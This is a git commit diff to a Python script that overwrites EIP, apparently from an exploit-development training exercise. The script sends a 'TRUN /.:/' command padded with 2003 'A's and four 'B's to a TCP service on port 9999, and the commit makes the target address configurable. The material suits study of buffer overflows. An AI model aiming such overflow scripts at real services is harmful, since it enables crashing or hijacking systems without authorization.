1f7181c564928da0176487642f49f4f40069d94e
MJWyattCyber <66680297+MJWyattCyber@users.noreply.github.com>
2021-05-09 19:48:17 +0100

    Update overwrite.py

--- Overwriting EIP/overwrite.py
+++ Overwriting EIP/overwrite.py
@@ -3,9 +3,12 @@ import sys, socket
 
 shellcode = "A" * 2003 + "B" * 4
 
+address = '127.0.0.1' #CHANGE THIS
+port = 9999 #CHANGE THIS
+
 try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(('192.168.10.162',9999))
+	s.connect((address,port))
 
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
